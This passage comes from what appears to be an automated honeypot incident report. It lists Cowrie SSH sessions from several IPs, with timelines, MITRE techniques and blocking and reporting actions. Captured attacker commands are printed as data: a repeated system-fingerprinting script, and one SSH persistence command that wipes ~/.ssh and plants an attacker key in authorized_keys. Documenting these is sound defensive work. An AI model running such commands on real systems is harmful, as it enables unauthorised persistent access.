| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:09:11` | `cowrie.session.connect` |
| `2026-09-08 03:09:12` | `cowrie.client.version` |
| `2026-09-08 03:09:12` | `cowrie.client.kex` |
| `2026-09-08 03:09:14` | `cowrie.login.success` |
| `2026-09-08 03:09:16` | `cowrie.session.params` |
| `2026-09-08 03:09:16` | `cowrie.command.input` |
| `2026-09-08 03:09:16` | `cowrie.log.closed` |
| `2026-09-08 03:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e180eb85b2a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-08 03:10 |
| **Last Seen** | 2026-09-08 03:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:10:51` | `cowrie.session.connect` |
| `2026-09-08 03:10:51` | `cowrie.client.version` |
| `2026-09-08 03:10:51` | `cowrie.client.kex` |
| `2026-09-08 03:10:52` | `cowrie.login.success` |
| `2026-09-08 03:10:52` | `cowrie.direct-tcpip.request` |
| `2026-09-08 03:10:52` | `cowrie.direct-tcpip.data` |
| `2026-09-08 03:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83809b832a2c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:11 |
| **Last Seen** | 2026-09-08 03:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:11:10` | `cowrie.session.connect` |
| `2026-09-08 03:11:10` | `cowrie.client.version` |
| `2026-09-08 03:11:10` | `cowrie.client.kex` |
| `2026-09-08 03:11:12` | `cowrie.login.success` |
| `2026-09-08 03:11:14` | `cowrie.session.params` |
| `2026-09-08 03:11:14` | `cowrie.command.input` |
| `2026-09-08 03:11:14` | `cowrie.log.closed` |
| `2026-09-08 03:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710453bffcc1

| Field | Detail |
|---|---|
| **Source IP** | `123.122.46[.]140` |
| **First Seen** | 2026-09-08 03:12 |
| **Last Seen** | 2026-09-08 03:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:12:57` | `cowrie.session.connect` |
| `2026-09-08 03:12:57` | `cowrie.client.version` |
| `2026-09-08 03:12:57` | `cowrie.client.kex` |
| `2026-09-08 03:12:58` | `cowrie.login.success` |
| `2026-09-08 03:12:59` | `cowrie.session.params` |
| `2026-09-08 03:12:59` | `cowrie.command.input` |
| `2026-09-08 03:12:59` | `cowrie.command.failed` |
| `2026-09-08 03:13:00` | `cowrie.log.closed` |
| `2026-09-08 03:13:01` | `cowrie.session.params` |
| `2026-09-08 03:13:01` | `cowrie.command.input` |
| `2026-09-08 03:13:01` | `cowrie.session.file_download` |
| `2026-09-08 03:13:01` | `cowrie.log.closed` |
| `2026-09-08 03:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.122.46[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.122.46[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac55c5667c0e

| Field | Detail |
|---|---|
| **Source IP** | `123.122.46[.]140` |
| **First Seen** | 2026-09-08 03:13 |
| **Last Seen** | 2026-09-08 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:13:01` | `cowrie.session.connect` |
| `2026-09-08 03:13:01` | `cowrie.client.version` |
| `2026-09-08 03:13:01` | `cowrie.client.kex` |
| `2026-09-08 03:13:02` | `cowrie.login.success` |
| `2026-09-08 03:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.122.46[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.122.46[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65734a1a732

| Field | Detail |
|---|---|
| **Source IP** | `123.122.46[.]140` |
| **First Seen** | 2026-09-08 03:13 |
| **Last Seen** | 2026-09-08 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:13:03` | `cowrie.session.connect` |
| `2026-09-08 03:13:03` | `cowrie.client.version` |
| `2026-09-08 03:13:03` | `cowrie.client.kex` |
| `2026-09-08 03:13:04` | `cowrie.login.success` |
| `2026-09-08 03:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.122.46[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.122.46[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ad177ec986d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:13 |
| **Last Seen** | 2026-09-08 03:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:13:06` | `cowrie.session.connect` |
| `2026-09-08 03:13:07` | `cowrie.client.version` |
| `2026-09-08 03:13:07` | `cowrie.client.kex` |
| `2026-09-08 03:13:09` | `cowrie.login.success` |
| `2026-09-08 03:13:11` | `cowrie.session.params` |
| `2026-09-08 03:13:11` | `cowrie.command.input` |
| `2026-09-08 03:13:11` | `cowrie.log.closed` |
| `2026-09-08 03:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d84a5b9758d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:14 |
| **Last Seen** | 2026-09-08 03:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:14:58` | `cowrie.session.connect` |
| `2026-09-08 03:14:58` | `cowrie.client.version` |
| `2026-09-08 03:14:58` | `cowrie.client.kex` |
| `2026-09-08 03:15:00` | `cowrie.login.success` |
| `2026-09-08 03:15:01` | `cowrie.session.params` |
| `2026-09-08 03:15:01` | `cowrie.command.input` |
| `2026-09-08 03:15:02` | `cowrie.log.closed` |
| `2026-09-08 03:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc90126f5913

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:18 |
| **Last Seen** | 2026-09-08 03:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:18:30` | `cowrie.session.connect` |
| `2026-09-08 03:18:30` | `cowrie.client.version` |
| `2026-09-08 03:18:30` | `cowrie.client.kex` |
| `2026-09-08 03:18:32` | `cowrie.login.success` |
| `2026-09-08 03:18:33` | `cowrie.session.params` |
| `2026-09-08 03:18:33` | `cowrie.command.input` |
| `2026-09-08 03:18:34` | `cowrie.log.closed` |
| `2026-09-08 03:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3bd8ca865c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:20 |
| **Last Seen** | 2026-09-08 03:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:20:14` | `cowrie.session.connect` |
| `2026-09-08 03:20:15` | `cowrie.client.version` |
| `2026-09-08 03:20:15` | `cowrie.client.kex` |
| `2026-09-08 03:20:16` | `cowrie.login.success` |
| `2026-09-08 03:20:18` | `cowrie.session.params` |
| `2026-09-08 03:20:18` | `cowrie.command.input` |
| `2026-09-08 03:20:18` | `cowrie.log.closed` |
| `2026-09-08 03:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f98df16917e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:22 |
| **Last Seen** | 2026-09-08 03:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:22:02` | `cowrie.session.connect` |
| `2026-09-08 03:22:02` | `cowrie.client.version` |
| `2026-09-08 03:22:02` | `cowrie.client.kex` |
| `2026-09-08 03:22:04` | `cowrie.login.success` |
| `2026-09-08 03:22:05` | `cowrie.session.params` |
| `2026-09-08 03:22:05` | `cowrie.command.input` |
| `2026-09-08 03:22:05` | `cowrie.log.closed` |
| `2026-09-08 03:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123d298aee30

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:23 |
| **Last Seen** | 2026-09-08 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:23:57` | `cowrie.session.connect` |
| `2026-09-08 03:23:57` | `cowrie.client.version` |
| `2026-09-08 03:23:57` | `cowrie.client.kex` |
| `2026-09-08 03:23:58` | `cowrie.login.success` |
| `2026-09-08 03:24:00` | `cowrie.session.params` |
| `2026-09-08 03:24:00` | `cowrie.command.input` |
| `2026-09-08 03:24:00` | `cowrie.log.closed` |
| `2026-09-08 03:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdbf4ca83e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:25 |
| **Last Seen** | 2026-09-08 03:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:25:58` | `cowrie.session.connect` |
| `2026-09-08 03:25:58` | `cowrie.client.version` |
| `2026-09-08 03:25:58` | `cowrie.client.kex` |
| `2026-09-08 03:25:59` | `cowrie.login.success` |
| `2026-09-08 03:26:00` | `cowrie.session.params` |
| `2026-09-08 03:26:00` | `cowrie.command.input` |
| `2026-09-08 03:26:00` | `cowrie.log.closed` |
| `2026-09-08 03:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5baa5486bfd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:27 |
| **Last Seen** | 2026-09-08 03:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:27:57` | `cowrie.session.connect` |
| `2026-09-08 03:27:57` | `cowrie.client.version` |
| `2026-09-08 03:27:57` | `cowrie.client.kex` |
| `2026-09-08 03:27:58` | `cowrie.login.success` |
| `2026-09-08 03:28:00` | `cowrie.session.params` |
| `2026-09-08 03:28:00` | `cowrie.command.input` |
| `2026-09-08 03:28:00` | `cowrie.log.closed` |
| `2026-09-08 03:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c607ada8361b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:29 |
| **Last Seen** | 2026-09-08 03:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:29:52` | `cowrie.session.connect` |
| `2026-09-08 03:29:52` | `cowrie.client.version` |
| `2026-09-08 03:29:52` | `cowrie.client.kex` |
| `2026-09-08 03:29:54` | `cowrie.login.success` |
| `2026-09-08 03:29:55` | `cowrie.session.params` |
| `2026-09-08 03:29:55` | `cowrie.command.input` |
| `2026-09-08 03:29:55` | `cowrie.log.closed` |
| `2026-09-08 03:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d17316eb6d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:31 |
| **Last Seen** | 2026-09-08 03:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:31:47` | `cowrie.session.connect` |
| `2026-09-08 03:31:47` | `cowrie.client.version` |
| `2026-09-08 03:31:47` | `cowrie.client.kex` |
| `2026-09-08 03:31:48` | `cowrie.login.success` |
| `2026-09-08 03:31:50` | `cowrie.session.params` |
| `2026-09-08 03:31:50` | `cowrie.command.input` |
| `2026-09-08 03:31:50` | `cowrie.log.closed` |
| `2026-09-08 03:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f090acba6328

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:33 |
| **Last Seen** | 2026-09-08 03:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:33:37` | `cowrie.session.connect` |
| `2026-09-08 03:33:37` | `cowrie.client.version` |
| `2026-09-08 03:33:37` | `cowrie.client.kex` |
| `2026-09-08 03:33:39` | `cowrie.login.success` |
| `2026-09-08 03:33:40` | `cowrie.session.params` |
| `2026-09-08 03:33:40` | `cowrie.command.input` |
| `2026-09-08 03:33:41` | `cowrie.log.closed` |
| `2026-09-08 03:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ef3eb461ec

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-08 03:33 |
| **Last Seen** | 2026-09-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:33:57` | `cowrie.session.connect` |
| `2026-09-08 03:33:57` | `cowrie.client.version` |
| `2026-09-08 03:33:57` | `cowrie.client.kex` |
| `2026-09-08 03:33:58` | `cowrie.login.success` |
| `2026-09-08 03:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f39ed8a9dfc

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-08 03:33 |
| **Last Seen** | 2026-09-08 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:33:57` | `cowrie.session.connect` |
| `2026-09-08 03:33:57` | `cowrie.client.version` |
| `2026-09-08 03:33:57` | `cowrie.client.kex` |
| `2026-09-08 03:33:58` | `cowrie.login.success` |
| `2026-09-08 03:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c942d6666132

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:35 |
| **Last Seen** | 2026-09-08 03:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
